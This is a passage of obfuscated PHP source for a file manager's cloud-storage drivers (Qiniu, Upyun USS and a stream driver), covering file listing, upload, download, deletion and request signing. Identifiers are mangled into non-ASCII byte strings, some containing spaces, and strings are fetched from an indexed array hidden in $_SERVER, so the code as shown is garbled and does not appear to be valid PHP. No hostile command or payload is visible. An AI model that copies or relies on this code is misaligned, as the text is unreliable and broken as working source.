$ùŒŞ­¾·[2025] => $¿ü«¦Ä, $ùŒŞ­¾·[2126] => $¿ õ£†Ù + time()); if (Session::get($ùŒŞ­¾·[2127])) { $æª°×’«[$ùŒŞ­¾·[1785]] = Session::get($ùŒŞ­¾·[2127]); } else { $æª°×’«[$ùŒŞ­¾·[1785]] = 0; } if ($this->get($äÀƒ¬§Á)) { return $this->where(array($ùŒŞ­¾·[2125] => $äÀƒ¬§Á))->save($æª°×’«); } else { return $this->add($æª°×’«, array(), !0); } } public function remove($™—Ãµç“) { return $this->where(array($_SERVER[ˆö¿ÚÌ¼][2125] => $™—Ãµç“))->delete(); } public function clearTimeout() { return $this->where($_SERVER[ˆö¿ÚÌ¼][2128] . time())->delete(); } } $_file = $_SERVER[$_SERVER[ˆö¿ÚÌ¼][488]]; goto D’‡†Ûóª‰; dË×§ÖÀõ: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($ì÷ËŞÜ) { parent::__construct(); require_once SDK_DIR . $_SERVER[ˆö¿ÚÌ¼][1542]; $this->_init($ì÷ËŞÜ); } public function _init($İªı ´Ú) { $²Æ°†¹¸ =& $_SERVER[ˆö¿ÚÌ¼]; $this->config = $İªı ´Ú; foreach ($İªı ´Ú as $­–ñÓÄ‰ => $™’ëœ¡Ñ) { if (isset($this->{$­–ñÓÄ‰})) { $this->{$­–ñÓÄ‰} = $™’ëœ¡Ñ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($²Æ°†¹¸[1543] . LNG($²Æ°†¹¸[1479])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($‰¤Î´› , $àİÊÙŸ = '', $Šëöô–„ = REPEAT_RENAME) { if ($this->setContent($‰¤Î´› , $àİÊÙŸ)) { return $this->getPathOuter($‰¤Î´› ); } return !1; } public function mkdir($×şäÀñø, $œŞª£Ì³ = REPEAT_SKIP) { $’èÎ˜ãô =& $_SERVER[ˆö¿ÚÌ¼]; $”Ùı˜Í• = trim($×şäÀñø, $’èÎ˜ãô[8]); if ($this->_isFolder($”Ùı˜Í•)) { return $this->getPathOuter($”Ùı˜Í•); } $×şäÀñø = $”Ùı˜Í• . $’èÎ˜ãô[8]; $Ãê×•Ş… = get_path_this($”Ùı˜Í•); $‡÷“¦©¡ = $×şäÀñø . $Ãê×•Ş…; if (!$this->mkfile($‡÷“¦©¡)) { return !1; } if (!$this->moveFile($‡÷“¦©¡, $×şäÀñø)) { $this->delFile($‡÷“¦©¡); return !1; } return $this->getPathOuter($”Ùı˜Í•); } public function copyFile($ãÓ¬›Ñ—, $æÂ¾æ£) { $èàœÇãï = $this->bucketManager->copy($this->bucket, $ãÓ¬›Ñ—, $this->bucket, $æÂ¾æ£, !0); return $èàœÇãï ? !1 : $this->getPathOuter($æÂ¾æ£); } public function moveFile($ù‚¢åªğ, $è÷şùß) { $¸ÈğÎ´“ = $this->bucketManager->move($this->bucket, $ù‚¢åªğ, $this->bucket, $è÷şùß, !0); return $¸ÈğÎ´“ ? !1 : $this->getPathOuter($è÷şùß); } public function delFile($çªŠäÅø) { if (!$this->exist($çªŠäÅø)) { return !0; } $ä¨µò = $this->bucketManager->delete($this->bucket, $çªŠäÅø); if (!$ä¨µò) { return !0; } return $ä¨µò->code() == 612 ? !0 : !1; } public function delFolder($à‚ç‰Ëà) { $áî™©‰ =& $_SERVER[ˆö¿ÚÌ¼]; if (!$this->exist($à‚ç‰Ëà)) { return !0; } $this->listItemCache = !1; $¤Û„ÜúÁ = $this->fileList($à‚ç‰Ëà); $this->listItemCache = !0; $÷«²Í°Ë = trim($à‚ç‰Ëà, $áî™©‰[8]) . $áî™©‰[8]; if (!empty($à‚ç‰Ëà) && $à‚ç‰Ëà !== $áî™©‰[231] && !in_array($÷«²Í°Ë, $¤Û„ÜúÁ[$áî™©‰[85]])) { $¤Û„ÜúÁ[$áî™©‰[85]][] = $÷«²Í°Ë; } $êİ¶ ç = $this->delByBatch($¤Û„ÜúÁ[$áî™©‰[86]]); if (!$êİ¶ ç) { return !1; } $êİ¶ ç = $this->delByBatch($¤Û„ÜúÁ[$áî™©‰[85]]); if (!$êİ¶ ç) { return !1; } return $this->delFile($÷«²Í°Ë); } private function delByBatch($Î•¨çğ¼) { foreach (array_chunk($Î•¨çğ¼, 1000) as $‚¸İ±ÓĞ) { $£ı®®äÁ = $this->bucketManager->buildBatchDelete($this->bucket, $‚¸İ±ÓĞ); list($´ĞéÏÉ×, $™´¤Øñ) = $this->bucketManager->batch($£ı®®äÁ); if ($™´¤Øñ) { return !1; } } return !0; } public function rename($Ø–Ìş•ü, $áä„Íê­) { return $this->renameObject($Ø–Ìş•ü, $áä„Íê­); } public function fileInfo($µì‹±Ë, $²½·äÂ = false, $…¢÷ä–œ = array()) { $¦ˆìü‹ =& $_SERVER[ˆö¿ÚÌ¼]; $äÁ˜¹”Â = array($¦ˆìü‹[32] => $this->pathThis($µì‹±Ë), $¦ˆìü‹[87] => $this->getPathOuter($¦ˆìü‹[8] . $µì‹±Ë), $¦ˆìü‹[33] => $¦ˆìü‹[233], $¦ˆìü‹[79] => isset($…¢÷ä–œ[$¦ˆìü‹[1544]]) ? $…¢÷ä–œ[$¦ˆìü‹[1544]] : 0, $¦ˆìü‹[169] => $this->ext($µì‹±Ë)); if ($²½·äÂ) { return $äÁ˜¹”Â; } $äÁ˜¹”Â[$¦ˆìü‹[234]] = $äÁ˜¹”Â[$¦ˆìü‹[88]] = 0; $äÁ˜¹”Â[$¦ˆìü‹[235]] = $äÁ˜¹”Â[$¦ˆìü‹[236]] = !0; if (empty($…¢÷ä–œ)) { $…¢÷ä–œ = $this->objectMeta($µì‹±Ë); if (!$…¢÷ä–œ) { return $äÁ˜¹”Â; } } if (isset($…¢÷ä–œ[$¦ˆìü‹[237]]) && $…¢÷ä–œ[$¦ˆìü‹[237]]) { $äÁ˜¹”Â[$¦ˆìü‹[238]] = $…¢÷ä–œ[$¦ˆìü‹[237]]; } if (isset($…¢÷ä–œ[$¦ˆìü‹[248]]) && $…¢÷ä–œ[$¦ˆìü‹[248]]) { $äÁ˜¹”Â[$¦ˆìü‹[238]] = $…¢÷ä–œ[$¦ˆìü‹[248]]; } if (isset($…¢÷ä–œ[$¦ˆìü‹[1545]])) { $äÁ˜¹”Â[$¦ˆìü‹[88]] = substr($…¢÷ä–œ[$¦ˆìü‹[1545]] . $¦ˆìü‹[12], 0, 10); } if (isset($…¢÷ä–œ[$¦ˆìü‹[1544]])) { $äÁ˜¹”Â[$¦ˆìü‹[79]] = $…¢÷ä–œ[$¦ˆìü‹[1544]]; } return $äÁ˜¹”Â; } public function folderInfo($ã¸³ô, $²ÀÚÀÉ = false) { $¬ÅÑï›Ù =& $_SERVER[ˆö¿ÚÌ¼]; $°í÷º”‚ = array($¬ÅÑï›Ù[32] => $this->pathThis($ã¸³ô), $¬ÅÑï›Ù[87] => $this->getPathOuter($¬ÅÑï›Ù[8] . $ã¸³ô), $¬ÅÑï›Ù[33] => $¬ÅÑï›Ù[78]); if ($²ÀÚÀÉ) { return $°í÷º”‚; } $°í÷º”‚[$¬ÅÑï›Ù[234]] = $°í÷º”‚[$¬ÅÑï›Ù[88]] = 0; $°í÷º”‚[$¬ÅÑï›Ù[235]] = $°í÷º”‚[$¬ÅÑï›Ù[236]] = !0; $ã¸³ô = rtrim($ã¸³ô, $¬ÅÑï›Ù[8]) . $¬ÅÑï›Ù[8]; $êÅÒä©Ü = $this->objectMeta($ã¸³ô); if (isset($êÅÒä©Ü[$¬ÅÑï›Ù[1545]])) { $°í÷º”‚[$¬ÅÑï›Ù[88]] = substr($êÅÒä©Ü[$¬ÅÑï›Ù[1545]] . $¬ÅÑï›Ù[12], 0, 10); } return $°í÷º”‚; } public function listPath($õ÷äÍ£ü, $ªÃü¬Îï = false) { $ˆâåÆ¬Ñ =& $_SERVER[ˆö¿ÚÌ¼]; $Ó–§Ñ‡® = $this->fileList($õ÷äÍ£ü, $ˆâåÆ¬Ñ[8], !0); foreach ($Ó–§Ñ‡®[$ˆâåÆ¬Ñ[85]] as $Ö±îé” => $ãÃÖÁÂ) { $Ó–§Ñ‡®[$ˆâåÆ¬Ñ[85]][$Ö±îé”] = $this->folderInfo($ãÃÖÁÂ, $ªÃü¬Îï); } foreach ($Ó–§Ñ‡®[$ˆâåÆ¬Ñ[86]] as $Ö±îé” => $ãÃÖÁÂ) { $Ó–§Ñ‡®[$ˆâåÆ¬Ñ[86]][$Ö±îé”] = $this->fileInfo($ãÃÖÁÂ[$ˆâåÆ¬Ñ[32]], $ªÃü¬Îï, $ãÃÖÁÂ); } return $Ó–§Ñ‡®; } public function has($˜®ŠóÜ³, $âÉÛâ±± = false, $…×§¬Æå = true) { $ïÌåÉñ‹ =& $_SERVER[ˆö¿ÚÌ¼]; $˜®ŠóÜ³ = trim($˜®ŠóÜ³, $ïÌåÉñ‹[8]); $®šèç“œ = empty($˜®ŠóÜ³) && $˜®ŠóÜ³ !== $ïÌåÉñ‹[231] ? $ïÌåÉñ‹[12] : $˜®ŠóÜ³ . $ïÌåÉñ‹[8]; $¼ùÀ = $ïÌåÉñ‹[12]; $Ù¯¸éÜò = 500; $°ª´°·ì = $ïÌåÉñ‹[8]; $ëğäÇÇ‚ = $×ªÙ¨¡ = 0; while (!0) { check_abort(); list($„÷î¦ù, $İµÕÜÓ•) = $this->bucketManager->listFiles($this->bucket, $®šèç“œ, $¼ùÀ, $Ù¯¸éÜò, $°ª´°·ì); if ($İµÕÜÓ•) { break; } $¼ùÀ = array_key_exists($ïÌåÉñ‹[1491], $„÷î¦ù) ? $¼ùÀ = $„÷î¦ù[$ïÌåÉñ‹[1546]] : $ïÌåÉñ‹[12]; if ($âÉÛâ±±) { if (!empty($„÷î¦ù[$ïÌåÉñ‹[1547]])) { $ëğäÇÇ‚ += count($„÷î¦ù[$ïÌåÉñ‹[1547]]); } if (!empty($„÷î¦ù[$ïÌåÉñ‹[1548]])) { $×ªÙ¨¡ += count($„÷î¦ù[$ïÌåÉñ‹[1548]]); } if ($¼ùÀ === $ïÌåÉñ‹[12]) { break; } continue; } if ($…×§¬Æå) { if (!empty($„÷î¦ù[$ïÌåÉñ‹[1547]])) { return !0; } } else { if (!empty($„÷î¦ù[$ïÌåÉñ‹[1548]])) { return !0; } } if ($¼ùÀ === $ïÌåÉñ‹[12]) { break; } } if ($âÉÛâ±±) { return array($ïÌåÉñ‹[242] => $ëğäÇÇ‚, $ïÌåÉñ‹[243] => $×ªÙ¨¡); } return !1; } public function listAll($—¥«ŞÒ) { $øçê’€¥ =& $_SERVER[ˆö¿ÚÌ¼]; $øš©Çîù = $this->fileList($—¥«ŞÒ, $øçê’€¥[12], !0); $àà¢ººÃ = array_to_keyvalue($øš©Çîù[$øçê’€¥[86]], $øçê’€¥[32]); foreach ($øš©Çîù[$øçê’€¥[85]] as $¼ç†”Ö§) { if (is_string($¼ç†”Ö§)) { $àà¢ººÃ[$¼ç†”Ö§] = array($øçê’€¥[79] => 0); } } return $this->listAllFiles($—¥«ŞÒ, $àà¢ººÃ); } private function fileList($Í¿­«óÍ, $µà½§æş = '', $Æ˜¬µ‰ = 0) { $ÍÙ£©†ß =& $_SERVER[ˆö¿ÚÌ¼]; $Í¿­«óÍ = trim($Í¿­«óÍ, $ÍÙ£©†ß[8]); $û•¡å€ = empty($Í¿­«óÍ) && $Í¿­«óÍ !== $ÍÙ£©†ß[231] ? $ÍÙ£©†ß[12] : $Í¿­«óÍ . $ÍÙ£©†ß[8]; $ÍØ·İøÄ = $ÍÙ£©†ß[12]; $äÀ†ˆüÇ = 1000; $íŞ…ëÂÔ = $Œ”ËëÁ = array(); while (!0) { check_abort(); list($‘¡¨óü, $Æı˜¼â¦) = $this->bucketManager->listFiles($this->bucket, $û•¡å€, $ÍØ·İøÄ, $äÀ†ˆüÇ, $µà½§æş); if ($Æı˜¼â¦) { break; } $ÍØ·İøÄ = array_key_exists($ÍÙ£©†ß[1491], $‘¡¨óü) ? $ÍØ·İøÄ = $‘¡¨óü[$ÍÙ£©†ß[1546]] : $ÍÙ£©†ß[12]; $‚ò‘Ñ“ = isset($‘¡¨óü[$ÍÙ£©†ß[1547]]) ? $‘¡¨óü[$ÍÙ£©†ß[1547]] : array(); $ê¾ëÃèº = isset($‘¡¨óü[$ÍÙ£©†ß[1548]]) ? $‘¡¨óü[$ÍÙ£©†ß[1548]] : array(); foreach ($‚ò‘Ñ“ as $•øñåÖ) { if ($•øñåÖ[$ÍÙ£©†ß[97]] == $û•¡å€) { continue; } $µìÒß…İ = $•øñåÖ[$ÍÙ£©†ß[97]]; $šÂº‚ò = $•øñåÖ[$ÍÙ£©†ß[1544]]; $•øñåÖ[$ÍÙ£©†ß[32]] = $µìÒß…İ; $•øñåÖ[$ÍÙ£©†ß[79]] = $šÂº‚ò; $ïÄ±ùÁİ = $šÂº‚ò == 0 && substr($µìÒß…İ, strlen($µìÒß…İ) - 1, 1) == $ÍÙ£©†ß[8] ? !0 : !1; $this->cacheMethodInfoSet($µìÒß…İ, $ïÄ±ùÁİ, $•øñåÖ); if ($ïÄ±ùÁİ) { $íŞ…ëÂÔ[] = $µìÒß…İ; continue; } $Œ”ËëÁ[] = $Æ˜¬µ‰ ? $•øñåÖ : $µìÒß…İ; } foreach ($ê¾ëÃèº as $µìÒß…İ) { if ($µìÒß…İ == $û•¡å€) { continue; } $íŞ…ëÂÔ[] = $µìÒß…İ; $this->cacheMethodInfoSet($µìÒß…İ, !0); } if ($ÍØ·İøÄ === $ÍÙ£©†ß[12]) { break; } } $this->cacheMethodInfoSet($Í¿­«óÍ, !0); return array($ÍÙ£©†ß[85] => $íŞ…ëÂÔ, $ÍÙ£©†ß[86] => $Œ”ËëÁ); } public function canRead($™¸‹ê‘) { return $this->exist($™¸‹ê‘) ? !0 : !1; } public function canWrite($Ññ±‰•Ş) { return $this->exist($Ññ±‰•Ş) ? !0 : !1; } public function getContent($¥˜ÔğÌ’) { return $this->fileSubstr($¥˜ÔğÌ’, 0, -1); } public function setContent($×ÄöÅ‹ , $…‡ç™Ò÷ = '') { $ˆ¶ŠÖØÉ = $this->tempFile($this->pathThis($×ÄöÅ‹ )); file_put_contents($ˆ¶ŠÖØÉ, $…‡ç™Ò÷); if ($this->upload($×ÄöÅ‹ , $ˆ¶ŠÖØÉ)) { $this->tempFileRemve($ˆ¶ŠÖØÉ); return !0; } return !1; } public function refreshUrls($ş‡¢Ø±ê) { $ÉƒÚ÷ÃÌ =& $_SERVER[ˆö¿ÚÌ¼]; $úÉ¶ã»Ö = array(); if (is_array($ş‡¢Ø±ê)) { foreach ($ş‡¢Ø±ê as $ÅÓ©Â©²) { $úÉ¶ã»Ö[] = $this->link($ÅÓ©Â©²); } } else { $úÉ¶ã»Ö[] = $this->link($ş‡¢Ø±ê); } $ï¼ş´» = new Qiniu\Cdn\CdnManager($this->auth); list($“ ®ˆÒ, $¯áğ…â•) = $ï¼ş´»->refreshUrls($úÉ¶ã»Ö); if ($¯áğ…â•) { return !1; } return $“ ®ˆÒ[$ÉƒÚ÷ÃÌ[1278]] == $ÉƒÚ÷ÃÌ[844] ? !0 : !1; } public function fileSubstr($»Ô²Øà¶, $çİáâ›ó, $ñ§Íâ¯Ç) { $âßõò©ğ =& $_SERVER[ˆö¿ÚÌ¼]; if (!($Û¥Ïåë’ = $this->link($»Ô²Øà¶))) { return !1; } $Ë„˜ÔÑİ = !1; if ($ñ§Íâ¯Ç > 0) { $Ü‡Á£°Ó = $çİáâ›ó + $ñ§Íâ¯Ç - 1; $Ë„˜ÔÑİ = array($âßõò©ğ[1549] . $çİáâ›ó . $âßõò©ğ[465] . $Ü‡Á£°Ó); } $…šç½ãÆ = url_request($Û¥Ïåë’, $âßõò©ğ[1510], !1, $Ë„˜ÔÑİ); return $…šç½ãÆ[$âßõò©ğ[835]] ? $…šç½ãÆ[$âßõò©ğ[1301]] : !1; } public function upload($õ«¡ƒÃÌ, $‹ë®Ï Ì, $„¤ğÉ§Æ = false, $ß‚È¤ó° = REPEAT_REPLACE) { $ŞÃûùâÉ = new Qiniu\Storage\UploadManager(); $·×«áğ„ = $this->auth->uploadToken($this->bucket, $õ«¡ƒÃÌ); $ê…¥®Ÿı = get_file_mime(get_path_ext($‹ë®Ï Ì)); list($õ™¡‚¼, $›ğ¥³¥) = $ŞÃûùâÉ->putFile($·×«áğ„, $õ«¡ƒÃÌ, $‹ë®Ï Ì, null, $ê…¥®Ÿı); return $›ğ¥³¥ ? !1 : $this->getPathOuter($õ«¡ƒÃÌ); } public function uploadFormData($İùÈ”Å, $¡éšÆ¸» = 3600) { return $this->uploadToken($İùÈ”Å, $¡éšÆ¸»); } public function uploadMultiData($ŞşäªÖÖ, $¦ë·ú» = 3600) { return $this->uploadToken($ŞşäªÖÖ, $¦ë·ú»); } private function uploadToken($ÅÏ ¥œ¨, $œ‹™ñë¶ = 3600) { $­•‹–­¯ =& $_SERVER[ˆö¿ÚÌ¼]; $¡¯Œğ› = $œ‹™ñë¶; $¿…ÂÍÂ× = array($­•‹–­¯[1550] => $­•‹–­¯[1551]); $¹ş£Üí = $ÅÏ ¥œ¨; $¦ ÏëÂš = $this->auth->uploadToken($this->bucket, $¹ş£Üí, $¡¯Œğ›, $¿…ÂÍÂ×, !0); $ñ‡™üõÏ = empty($this->region) || $this->region == $­•‹–­¯[1552] ? $­•‹–­¯[12] : $­•‹–­¯[465] . $this->region; $À®ÆñÃ = http_type() . "\72\57\57\x75\x70\x6c\x6f\141\144{$ñ‡™üõÏ}\x2e\161\x69\156\151\x75\160\x2e\x63\x6f\155\57"; return array($­•‹–­¯[1553] => $¦ ÏëÂš, $­•‹–­¯[1554] => $À®ÆñÃ); } public function download($¢¥‹ÜÛÖ, $í‚ê¤•®) { $íïÙÛ“ = IO::getPathInner(IO::mkfile($í‚ê¤•®)); if (!($åÕ‹»˜ = $this->link($¢¥‹ÜÛÖ))) { return !1; } $ì©ÀØ™ë = 0; $‘ËŠß²ß = 1024 * 200; $ºü‡Ò´÷ = fopen($íïÙÛ“, $_SERVER[ˆö¿ÚÌ¼][1555]); while (!0) { $¢Ş–š€Ÿ = $this->fileSubstr($¢¥‹ÜÛÖ, $ì©ÀØ™ë, $‘ËŠß²ß); if ($¢Ş–š€Ÿ === !1) { return !1; } fwrite($ºü‡Ò´÷, $¢Ş–š€Ÿ); $ì©ÀØ™ë += $‘ËŠß²ß; if (strlen($¢Ş–š€Ÿ) < $‘ËŠß²ß) { break; } } fclose($ºü‡Ò´÷); return $í‚ê¤•®; } public function link($Ó÷¤ƒ¼É, $¢®¦àúğ = '') { if (!$this->isFile($Ó÷¤ƒ¼É)) { return !1; } $‰†¬ëâ = $this->getHost() . $_SERVER[ˆö¿ÚÌ¼][8] . $this->pathEncode($Ó÷¤ƒ¼É) . $¢®¦àúğ; return $this->auth->privateDownloadUrl($‰†¬ëâ, 3600 * 12); } public function fileOut($Éö‹ÏÙ, $ñşêù = false, $Á±»é¦ø = false, $¡¤ˆ«Òñ = '') { $å—Áì¼† =& $_SERVER[ˆö¿ÚÌ¼]; if ($this->isFileOutServer()) { return $this->fileOutServer($Éö‹ÏÙ, $ñşêù, $Á±»é¦ø, $¡¤ˆ«Òñ); } if (!$Á±»é¦ø) { $Á±»é¦ø = $this->pathThis($Éö‹ÏÙ); } $„ãÆŠ”© = $ñşêù ? $å—Áì¼†[1556] . rawurlencode($Á±»é¦ø) : $å—Áì¼†[12]; $ì¯óĞ¬ = $this->link($Éö‹ÏÙ, $„ãÆŠ”©); $this->fileOutLink($ì¯óĞ¬); } public function fileOutServer($ë¡ˆŸş², $Ë…¬»² = false, $ú÷¦¡á¿ = false, $˜ì®Şš = '') { parent::fileOut($ë¡ˆŸş², $Ë…¬»², $ú÷¦¡á¿, $˜ì®Şš); } public function fileOutImage($ŞÁÒÇÂü, $Øƒéá³— = 250) { if ($this->size($ŞÁÒÇÂü) > 1024 * 1024 * 20) { return $this->fileOutImageServer($ŞÁÒÇÂü, $Øƒéá³—); } $Ü¨½ÏÖğ = $this->link($ŞÁÒÇÂü, $_SERVER[ˆö¿ÚÌ¼][1557] . $Øƒéá³—); $this->fileOutLink($Ü¨½ÏÖğ); } public function fileOutImageServer($ºá¸„á‚, $‡ê±×» = 250) { parent::fileOutImage($ºá¸„á‚, $‡ê±×»); } public function hashMd5($¦×Êª˜º) { $İ¡«µÌ¥ =& $_SERVER[ˆö¿ÚÌ¼]; $Ëìùü¸Â = $this->objectMeta($¦×Êª˜º); return isset($Ëìùü¸Â[$İ¡«µÌ¥[248]]) ? $Ëìùü¸Â[$İ¡«µÌ¥[248]] : !1; $œÚ™¼Æ¥ = $this->link($¦×Êª˜º, $İ¡«µÌ¥[1558]); } public function size($‰ÜíÏ¤) { $úÅ£—¾Ö = $this->objectMeta($‰ÜíÏ¤); return $úÅ£—¾Ö ? $úÅ£—¾Ö[$_SERVER[ˆö¿ÚÌ¼][79]] : 0; } public function info($’ ÷æ“Ã) { if ($this->isFolder($’ ÷æ“Ã)) { return $this->folderInfo($’ ÷æ“Ã); } else { if ($this->isFile($’ ÷æ“Ã)) { return $this->fileInfo($’ ÷æ“Ã); } } return !1; } public function exist($¢ÂóÍÙ) { return $this->isFile($¢ÂóÍÙ) || $this->isFolder($¢ÂóÍÙ); } public function isFile($‰’ªè¬Ó) { return !$this->isFolder($‰’ªè¬Ó) && $this->objectMeta($‰’ªè¬Ó); } public function isFolder($¬ƒ›ü²‡) { return $this->cacheMethod($_SERVER[ˆö¿ÚÌ¼][180], $¬ƒ›ü²‡); } protected function objectMeta($±¼ñï©Ó) { return $this->cacheMethod($_SERVER[ˆö¿ÚÌ¼][182], $±¼ñï©Ó); } protected function _objectMeta($ø¹äóš‰) { $¯ˆë¹¤Ù =& $_SERVER[ˆö¿ÚÌ¼]; list($¹©©í‚‰, $˜¯˜òæî) = $this->bucketManager->stat($this->bucket, $ø¹äóš‰); if ($¹©©í‚‰) { $¹©©í‚‰[$¯ˆë¹¤Ù[79]] = intval($¹©©í‚‰[$¯ˆë¹¤Ù[1544]]); } return $¹©©í‚‰; } protected function _isFolder($Å„•ó‡) { $øÓƒ±° =& $_SERVER[ˆö¿ÚÌ¼]; if ($Å„•ó‡ == $øÓƒ±°[12] || $Å„•ó‡ == $øÓƒ±°[8]) { return !0; } list($Ï„­¨üè, $É·ÇÆ) = $this->bucketManager->listFiles($this->bucket, trim($Å„•ó‡, $øÓƒ±°[8]) . $øÓƒ±°[8], $øÓƒ±°[12], 1, $øÓƒ±°[8]); return !empty($Ï„­¨üè[$øÓƒ±°[1547]]) || !empty($Ï„­¨üè[$øÓƒ±°[1548]]) ? !0 : !1; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($óÆ‡†§ã, $êŞ’ŸâÈ = 0) { parent::__construct(); $this->source = $óÆ‡†§ã; $this->sourceSize = $êŞ’ŸâÈ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($³ÚÖËêï = false) { return $this->sourceSize; } public function getContent($¡³×¼÷Á = false) { return $this->fileSubstr($¡³×¼÷Á, 0, $this->sourceSize); } public function fileSubstr($¿Ëış‡ = false, $…ğéà«´ = 0, $çÂà¥œ¶ = 0) { if (!$çÂà¥œ¶) { $çÂà¥œ¶ = $this->sourceSize; } $¾àèÀºÜ = $this->sourceSize - $…ğéà«´; if ($çÂà¥œ¶ >= $¾àèÀºÜ) { $çÂà¥œ¶ = $¾àèÀºÜ; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $…ğéà«´, $çÂà¥œ¶); } if ($this->sourceType == self::TYPE_FILE) { if ($çÂà¥œ¶ <= 0) { return $_SERVER[ˆö¿ÚÌ¼][12]; } $Ö­ğ¾Ìå = ftell($this->source); fseek_64($this->source, $Ö­ğ¾Ìå + $…ğéà«´); $åüşØ¼Ø = @fread($this->source, $çÂà¥œ¶); fseek_64($this->source, $Ö­ğ¾Ìå); return $åüşØ¼Ø; } } public function hashMd5($›şğÍ¥Â = false) { return md5($this->getContent()); } public static function hash($ŒŞøˆø, $”û¼“áñ = 0) { $ÆÑö«Üß = new PathDriverStream($ŒŞøˆø, $”û¼“áñ); return $ÆÑö«Üß->hashSimple($ŒŞøˆø); } public static function md5($Ö¿åß™Á, $…ïñÂ€ı = 0) { $º–Èœ˜ã = new PathDriverStream($Ö¿åß™Á, $…ïñÂ€ı); return $º–Èœ˜ã->hashMd5($Ö¿åß™Á); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\x74\x74\160\72\x2f\x2f\x76\60\56\x61\160\151\56\165\x70\171\x75\156\56\x63\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($“ˆà£¤‘) { parent::__construct(); $this->_init($“ˆà£¤‘); } public function _init($³è¦ûµ) { $È•Öè²² =& $_SERVER[ˆö¿ÚÌ¼]; foreach ($³è¦ûµ as $Ö¨Ø’±î => $¸´ì™ÈÛ) { if (isset($this->{$Ö¨Ø’±î})) { $this->{$Ö¨Ø’±î} = $¸´ì™ÈÛ; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($È•Öè²²[1559] . LNG($È•Öè²²[1479])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($ãğúö¼, $”³–Æ¼º = "\107\105\124") { $ÅºŒÃ‰¥ =& $_SERVER[ˆö¿ÚÌ¼]; $¹óÁ­± = gmdate($ÅºŒÃ‰¥[1508]); $¬î™Û×Ñ = base64_encode(hash_hmac($ÅºŒÃ‰¥[1560], "{$”³–Æ¼º}\46{$ãğúö¼}\x26{$¹óÁ­±}", md5("{$this->userpass}"), !0)); $±ŒÀÁıÚ = array("\x41\165\x74\x68\157\x72\151\172\x61\x74\151\157\156\72\125\120\131\125\116\x20{$this->username}\x3a{$¬î™Û×Ñ}", "\104\x61\164\145\x3a{$¹óÁ­±}"); return $±ŒÀÁıÚ; } public function ussRequest($¼‰İÌ²ß, $¬°õ¸õ = "\107\105\124", $®øê¢åá = false, $š’æú× = false, $Ü‡Ìıªñ = false) { $âšˆ§¦¯ =& $_SERVER[ˆö¿ÚÌ¼]; $¼‰İÌ²ß = trim($¼‰İÌ²ß, $âšˆ§¦¯[8]); $•‘Â€Ø = "\57{$this->bucket}\x2f" . rawurlencode($¼‰İÌ²ß); $Û¦İç¼Ã = $this->ussHeaders($•‘Â€Ø, $¬°õ¸õ); if ($š’æú×) { $Û¦İç¼Ã = array_merge($Û¦İç¼Ã, $š’æú×); } $¨Ã®Ö¸é = url_request($this->endpoint . $•‘Â€Ø, $¬°õ¸õ, $®øê¢åá, $Û¦İç¼Ã, $Ü‡Ìıªñ); if (!$¨Ã®Ö¸é) { $¨€—ıÏß = LNG($âšˆ§¦¯[1561]); $this->writeLog($¨€—ıÏß); return array($âšˆ§¦¯[1311] => !1, $âšˆ§¦¯[1301] => $¨€—ıÏß); } if (strtolower($¬°õ¸õ) == $âšˆ§¦¯[230] || in_array($¨Ã®Ö¸é[$âšˆ§¦¯[1311]], array($âšˆ§¦¯[264], $âšˆ§¦¯[1562]))) { $®øê¢åá = $¨Ã®Ö¸é[$âšˆ§¦¯[1563]]; if (!$¨Ã®Ö¸é[$âšˆ§¦¯[835]]) { $®øê¢åá = isset($®øê¢åá[0]) ? $®øê¢åá[0] : $âšˆ§¦¯[12]; } } else { $®øê¢åá = json_decode($¨Ã®Ö¸é[$âšˆ§¦¯[1301]], !0); if (!$®øê¢åá) { $®øê¢åá = $¨Ã®Ö¸é[$âšˆ§¦¯[1301]]; } else { if (!$¨Ã®Ö¸é[$âšˆ§¦¯[835]] && isset($®øê¢åá[$âšˆ§¦¯[1564]])) { $®øê¢åá = $®øê¢åá[$âšˆ§¦¯[1564]]; } } } if (!$¨Ã®Ö¸é[$âšˆ§¦¯[835]]) { $this->writeLog($this->__errorMessage($®øê¢åá)); } return array($âšˆ§¦¯[1311] => $¨Ã®Ö¸é[$âšˆ§¦¯[835]], $âšˆ§¦¯[1301] => $®øê¢åá); } private function __errorMessage($Ÿ²­«“•) { $Ï¢ßš£ø =& $_SERVER[ˆö¿ÚÌ¼]; if (!$Ÿ²­«“•) { return $Ï¢ßš£ø[12]; } static $¥€Ï¶è— = null; if (!$¥€Ï¶è—) { $¥€Ï¶è— = I18n::getType(); } if ($¥€Ï¶è— != $Ï¢ßš£ø[1517]) { return $Ÿ²­«“•; } $õ‹ÎÊ­ï = array($Ï¢ßš£ø[1565] => $Ï¢ßš£ø[1566], $Ï¢ßš£ø[1567] => $Ï¢ßš£ø[1568], $Ï¢ßš£ø[1569] => $Ï¢ßš£ø[1568], $Ï¢ßš£ø[1570] => $Ï¢ßš£ø[1571], $Ï¢ßš£ø[1572] => $Ï¢ßš£ø[1573], $Ï¢ßš£ø[1574] => $Ï¢ßš£ø[1575], $Ï¢ßš£ø[1576] => $Ï¢ßš£ø[1577]); return isset($õ‹ÎÊ­ï[$Ÿ²­«“•]) ? $õ‹ÎÊ­ï[$Ÿ²­«“•] : 